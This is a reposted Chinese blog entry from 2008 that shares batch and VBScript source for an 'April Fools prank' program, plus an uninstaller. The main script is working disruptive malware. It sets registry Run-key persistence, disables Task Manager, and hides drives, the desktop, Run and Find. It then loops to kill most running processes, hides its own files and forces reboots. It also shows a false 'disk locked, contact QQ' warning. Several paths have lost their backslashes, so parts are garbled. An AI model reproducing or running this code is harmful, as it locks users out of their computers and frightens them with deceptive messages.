---
title: 愚人节整蛊程序源码
description: ::Codeby逍遥@浪子@08-03-31浪子博客:http://hi.baidu.com/逍遥问  QQ:422547345  ::流氓怕武术论坛:http://www.du110.com/     DOS联盟论坛:http://www.CN-DOS.net/frome  欢迎您的来访!::友情提醒您:源码仅供学习交流用,写成恶意脚本危害他人者,后果自负!@echooff&setlocalEnableDelayedExpansion
date: 2008-04-01 08:54:51
category: 杂七杂八
tags: ['愚人节', '整蛊', '源码']
post_id: 433
alias: yurenjie-zhenggu-yuanma
ViewNums: 5796
---

[夜火](/blog/)明天就是[愚人节](/tags/%E6%84%9A%E4%BA%BA%E8%8A%82)了，在逍遥浪子的百度空间里看到他写的一个愚人节程序[源码](/tags/%E6%BA%90%E7%A0%81)，转来给大家共享

:: Code by逍遥@浪子@ 08-03-31 浪子博客:http://hi.baidu.com/逍遥问   QQ:422547345
:: 流氓怕武术论坛:http://www.du110.com/      DOS联盟论坛:http://www.CN-DOS.net/frome   欢迎您的来访!
:: 友情提醒您:源码仅供学习交流用,写成恶意脚本危害他人者,后果自负!
@echo off & setlocal EnableDelayedExpansion
echo MsgBox "亲爱的朋友,由于你的机器非法使用了逍遥@浪子@提供的P处理,硬盘已经被锁死,若想解锁硬盘,请联系浪子!~   QQ:422547345 ", 16, "警告!" > C:v.vbs
reg add "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun" /v Autodesk /t REG_SZ /d C:v.vbs /f
reg add "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun" /v AutoCAD /t REG_SZ /d C:shouhu.vbs /f
reg add "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v DisableTaskMgr /t reg_dword /d 00000001 /f
echo Windows Registry Editor Version 5.00 >autorun.reg
echo. >>autorun.reg
echo [HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer] >>autorun.reg
echo "nodrives"=dword:ffffffff >>autorun.reg
echo "StartMenuLogOff"=dword:00000001 >>autorun.reg
echo "NoRun"=dword:00000001 >>autorun.reg
echo "NoFind"=dword:00000001 >>autorun.reg
echo "nodesktop"=dword:00000001 >>autorun.reg
echo. >>autorun.reg
regedit /s autorun.reg & del /s /q autorun.reg 1>nul
echo alg.exe >>process.ini
echo csrss.exe >>process.ini
echo explorer.exe >>process.ini
echo lsass.exe >>process.ini
echo smss.exe >>process.ini
echo ctfmon.exe >>process.ini
echo services.exe >>process.ini
echo svchost.exe >>process.ini
echo winlogon.exe >>process.ini
echo System >>process.ini
echo System Idle Process >>process.ini
echo Wscript.exe >>process.ini
echo cmd.exe >>process.ini
echo QQ.exe >>process.ini
echo iexplore.exe >>process.ini
echo ^@echo off&Setlocal EnableDelayedExpansion >>taskkill.cmd
echo for /f "tokens=1 delims=," %%a in ('tasklist /nh /FO CSV') do ( >>taskkill.cmd
echo     for /f "delims=" %%b in (Process.ini) do ( >>taskkill.cmd
echo         set /a flag+=1 >>taskkill.cmd
echo         if /i not %%a=="%%b" set /a num+=1 >>taskkill.cmd
echo     ) >>taskkill.cmd
echo     if !flag! equ !num! ntsd -c q -pn %%a >>taskkill.cmd
echo     set /a flag=num=0 >>taskkill.cmd
echo ) >>taskkill.cmd
echo dim ws >>%SYSTEMDRIVE%shouhu.vbs
echo set ws=CreateObject("Wscript.Shell") >>C:shouhu.vbs
echo Do >>%SYSTEMDRIVE%shouhu.vbs
echo Set ws = CreateObject("Wscript.Shell") >>C:shouhu.vbs
echo ws.run "cmd /c taskkill.cmd",vbhide >>C:shouhu.vbs
echo Wscript.Sleep 5000 >>C:shouhu.vbs
echo Loop >>C:shouhu.vbs
echo shutdown -r -f -t 0 >>C:
estart.cmd
for %%d in (process.ini,shouhu.vbs,taskkill.cmd,vbs.vbs,shutdown.vbs) do if not exist C:\%%d copy %%d C:\%%d
for %%f in (process.ini,shouhu.vbs,taskkill.cmd,vbs.vbs,restart.cmd,shutdown.vbs,v.vbs
) do if exist C:\%%f attrib +s +h +r C:\%%d
del taskkill.cmd /q & del process.ini /q
attrib "C:windowsstart menu*.*" +h /s
taskkill /F /im explorer.exe 1>nul & start explorer.exe & start shutdown.vbs
ping 127.0.0.1 -n 300 >nul
shutdown -r -f -t 10 -c "浪子友情提醒你,由于你多次选择稍后重启系统,导致病毒无法正常运行,浪子决定立刻重新启动!"
del %0

以上为主程序,可以保存为任意名字.CMD执行

do
x = Msgbox("病毒安装完毕!重新启动后生效!是否立刻重新启动电脑?   立刻重启选[是]    稍后重启选[否] ", 4, "是否重新启动?")
Set WshShell = WScript.CreateObject("WScript.Shell")
If x = 6 Then
WshShell.Run "C:
estart.cmd"
WScript.Quit(0)
End If
If x = 7 Then
Wscript.sleep 60000
End If
loop

这段为shutdown.vbs内容

do
Wscript.Sleep 10000
MsgBox "亲爱的朋友,你电脑已经中了愚人节病毒,现在,病毒将迈着矫健的步伐,通过你的身体.... ", 16, "警告!"
Wscript.Sleep 10000
MsgBox "亲爱的，我又开始想你了，我对你的爱每天都在巨增，因为有人告诉我:猪肉涨价了，你能卖个好价钱！ ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "龟兔赛跑，猪做裁判，你说是龟跑得快还是兔子跑得快？ ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "今天你吃得饱吗？睡得好吗？深夜会冷吗？真想静静地守在你身边。我知道你总是不会照顾自己，每当我一离开，你就从猪栏跳出去！ ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "你以后不要再喝醉了,昨天又有人看到你端着个酒杯追着一头猪，嘴里还大叫:是不是兄弟？是兄弟的干了！ ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "一只蛐蛐跟猪打赌说：我跳进草里你就看不见我，猪说：我要看得见呢？于是蛐蛐跳进草里。猪在看，猪在看！猪还在看！猪咋还在看呢？！ ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "当你一个人空虚寂寞时，铅笔也许是你最好的玩物。你可以用小刀割它，削它，砍它，同时可以发泄自己，高声吼着：我杀笔，我杀笔，我杀笔了 ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "哭了吧傻了吧，幸福的日子没有了吧？早警告过你，不要贪吃贪睡，可你就是不听。这下你该记住了吧，猪长到一定分量就要出栏的。 ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "山谷里传来你的声音，我往下眺望，在山的拐角发现你，是你！真的是你！你和一老翁在一起，我激动的跑过去说：大爷，借驴用用 ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "如果今天晚上有颗星星掉下来砸到了你的头上请不要担心，这是我托神仙送给你的礼物，从此你就会过着无忧无虑的幸福生活，因为―傻掉了。 ", 64, "哟,小样!"
Wscript.Sleep 10000
MsgBox "亲爱的朋友,愚人节快乐!本程序将在24小时后自己卸载,不会对你系统造成任何危害。 ", 64, "愚人节快乐!"
loop

这段为VBS.VBS内容

echo Windows Registry Editor Version 5.00 >autorun.reg
echo. >>autorun.reg
echo [HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer] >>autorun.reg
echo "nodrives"=dword:00000000 >>autorun.reg
echo "StartMenuLogOff"=dword:00000000 >>autorun.reg
echo "NoRun"=dword:00000000 >>autorun.reg
echo "NoFind"=dword:00000000 >>autorun.reg
echo "nodesktop"=dword:00000000 >>autorun.reg
echo. >>autorun.reg
regedit /s autorun.reg & del /s /q autorun.reg 1>nul

reg delete "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun" /v Autodesk /f
reg delete "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun" /v AutoCAD /f

reg add "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v DisableTaskMgr /t reg_dword /d 00000000 /f
for %%d in (process.ini,shouhu.vbs,taskkill.cmd,vbs.vbs,restart.cmd,shutdown.vbs) do if exist C:\%%d del C:\%%d /q
taskkill /F /im explorer.exe 1>nul & start explorer.exe

这段为卸载程序unstall.CMD

纯粹为写着玩,希望大家能开发出更有创意的P,共同交流,学习进步!~

最后,祝愿大家愚人节快乐!~

